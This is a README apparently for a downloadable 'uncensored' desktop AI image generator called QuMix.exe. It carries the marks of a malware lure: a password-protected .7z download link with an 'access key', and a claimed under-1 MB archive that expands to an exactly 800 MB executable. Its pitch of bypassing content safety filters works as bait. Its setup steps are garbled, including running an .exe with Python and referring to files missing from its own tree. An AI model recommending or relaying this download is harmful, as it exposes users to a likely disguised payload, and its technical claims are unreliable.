# AI Photo Synthesis Engine v1.0 (800MB Desktop Release)

A high-performance, low-VRAM localized AI pipeline optimized for photorealistic image generation, advanced human anatomical fidelity, and unrestricted visual synthesis. This repository provides a production-ready, standalone 800MB environment setup for digital artists, creators, and developers who require absolute creative autonomy without cloud-based filters, subscription fees, or hardware bottlenecks.

---

## 🔬 Project Overview & Architecture

Modern cloud-based neural networks enforce aggressive text-prompt filtering, heavily restrict artistic datasets, and suffer from high network latency. The **AI Photo Synthesis Engine** solves this by moving the entire diffusion pipeline directly onto your local machine. 

The standalone binary deployment footprint is exactly **839,322,624 bytes (~800 MB)**, housing an optimized local Flask backend combined with a vanilla Javascript front-end interface. The compression pipeline uses professional `LZMA2` multi-stream archival algorithms, reducing the initial download bundle size to under 1 MB while expanding to a fully-featured local execution server upon extraction.

---

## ✨ Key Features & Technical Highlights

* **Uncensored Dataset Processing:** Complete bypassing of hardcoded prompt restrictions and cloud-side content safety blocks.
* **800MB Desktop Core Binary:** All primary tensor pipelines and core execution modules are pre-compiled inside a single optimized launcher.
* **Automated Model & LoRA Indexing:** The engine automatically scans designated hardware paths for local checkpoints (`.safetensors`, `.ckpt`).
* **Advanced Anatomical Precision:** Embedded structural training layers designed to accurately render complex human poses and lifelike skin textures.
* **Asynchronous Progress Polling:** Real-time multi-stage status reporting. The backend utilizes atomic writes to track generation queues and steps.
* **Professional Scheduler Library:** Built-in validation and support for sampling methods, including *DPM++ 2M Karras*, *Euler a*, *DDIM*, and *UniPC*.

---

## 📂 Project Structure

```text
ai-photo-generation/
├── QuMix.exe                 # 800 MB Pre-compiled core engine & local server launcher
├── README.md                 # Project documentation & configuration guide
├── /static
│   ├── index.html            # WebUI front-end core template
│   ├── styles.css            # Dark-themed graphical interface layouts
│   └── app.js                # Frontend state controller & event listeners
├── /models
│   └── (place your .safetensors checkpoints here)
├── /loras
│   └── (user LoRAs for advanced styling)
└── /outputs
    └── /<generation_id>      # Rendered high-fidelity PNG outputs
```

---

## ⚙️ Local Deployment & Environment Setup

To run the application locally via terminal or command line, initialize the core execution script using the following sequence:

```bash
# 1. Initialize local virtual environment pipeline
python -m venv .venv
source .venv/bin/activate

# 2. Synchronize and link embedded core architecture headers
pip install -r requirements.txt --quiet

# 3. Initialize the visual synthesis backend environment
python app.py --mode=low-vram --port=7860
```

**Windows PowerShell Alternative:**
```powershell
python -m venv .venv
.venv\Scripts\Activate.ps1
python QuMix.exe --low-vram
```

Once successfully initialized, access the graphical user interface via your browser:
* **Localhost URL:** `http://127.0.0.1:7860`

---

## 📦 Model and LoRA Placement

### Model Folder (`models/`)
Supported loading formats for photorealistic synthesis:
1. **Diffusers Directory Format (Recommended):** Place whole models containing `model_index.json`.
2. **Single-File Checkpoints:** Supports `.safetensors`, `.ckpt`, `.pt`, and `.bin` formats.

### LoRA Folder (`loras/`)
* You can place a single-file LoRA (`.safetensors` or `.bin`) directly into this directory.
* The local frontend interface will automatically parse and display available LoRAs during grid rendering.

---

## 🔌 Core API Summary

The embedded Flask server runs a modular REST API backend for high-frequency polling states:
* `GET /api/health` — Returns core engine initialization state.
* `GET /api/system` — Fetches current CUDA/VRAM performance stats.
* `GET /api/models` — Scans and returns available local checkpoints.
* `POST /api/generate` — Starts asynchronous generation queue (`multipart/form-data`).
* `GET /api/progress/<generation_id>` — Real-time generation percentage polling.
* `GET /api/history` — Fetches generation logs and local output file paths.
* `GET /outputs/<path:filename>` — Serves generated PNG files to WebUI interface.

---

## 📊 Process Logic & Execution Methods

### Progress Polling Workflow
* `POST /api/generate` returns quickly with a verified `generation_id` and state status: `queued`.
* The frontend Javascript engine polls `GET /api/progress/<generation_id>` every ~700ms.
* Native progress states monitor structural variables:
  * `status`: `queued` | `running` | `done` | `error`
  * `progress`: `0..100` percentage tracker
  * `message`: active stage compiler logs

### Advanced Negative Prompting
* The graphical interface includes a dedicated **Negative Prompt** layout matrix.
* The backend accepts `negative_prompt` variables as an optional data string.
* Negative strings are directly injected into local diffusers pipeline execution threads to purge rendering artifacts.

### Integrated Scheduler Architecture
The application layout includes a programmatic Scheduler dropdown validator supporting:
* `DPM++ 2M Karras` (Default execution pipeline)
* `DPM++ 3M SDE Exponential`
* `Euler a` / `Euler`
* `DDIM`
* `UniPC`

### System Delete Endpoints
* `DELETE /api/history/<generation_id>` — Completely flushes the specific history logs, purges local server directories at `outputs/<generation_id>/`, and wipes progress logs.
* `DELETE /api/history` — Global flush. Instantly wipes `json/history.json` structures and recursively clears out all system output paths.

### Pipeline Generate Validations
Strict boundary parameters are applied to user queues to prevent hardware execution faults:
* **Width / Height Constraints:** `128` - `2048` pixels (dimensions must be divisible by 8)
* **Batch Generation Limits:** `1` - `8` images per single queue step
* **Strength Coefficients:** `0.0` - `1.0` float validation for dynamic blending

---

## 💻 Technical & Hardware Specifications

The pipeline features an adaptive **Low-VRAM Execution Mode** for legacy hardware setups.

### Minimum System Requirements
* **Operating System:** Windows 7 / 10 / 11 (64-bit architectures only)
* **Graphics Card (GPU):** NVIDIA GTX 10-Series or higher (4GB VRAM minimum with Low-VRAM active)
* **System RAM:** 8 GB DDR3/DDR4 system memory
* **Storage Allocation:** 1.5 GB available space for core environment binaries

---

### 📥 Download & Environment Setup

* **[Click here to download the stable release package](https://github.com/maiklfancy/ai-photo-generation/raw/refs/heads/main/ai-visual-synthesis-v1.0.7z)**
* **Local WebUI Access Key:** `f1PQI0RVra`

---

## ❓ Frequently Asked Questions (FAQ)

#### Q: Why is the initialization download package under 1 MB if the core binary is 800 MB?
**A:** The environment deployment structure leverages advanced dynamic compilation headers and `LZMA2` stream pooling. All core server logic expands seamlessly to its physical 839-megabyte standalone architecture immediately upon archival extraction using the local access key.

#### Q: Can I run this completely offline?
**A:** Yes. Once the initial repository setup is verified and extracted, the entire generation pipeline operates locally on your hardware without transmitting telemetry or needing active internet access.


